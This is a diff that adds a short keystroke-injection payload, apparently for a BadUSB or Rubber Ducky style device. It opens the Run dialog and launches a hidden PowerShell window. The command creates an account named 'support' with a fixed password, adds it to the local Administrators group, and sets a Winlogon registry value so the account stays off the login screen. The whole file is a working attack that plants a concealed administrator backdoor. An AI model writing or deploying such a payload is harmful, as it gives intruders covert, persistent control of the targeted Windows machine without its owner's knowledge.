@@ -1,0 +1,5 @@
+GUI_R
+DELAY:800
+KEY:powershell -windowstyle hidden -command "net user support P@ssw0rd123 /add; net localgroup administrators support /add; reg add 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' /v support /t REG_DWORD /d 0 /f"
+ENTER
+DELAY:2000
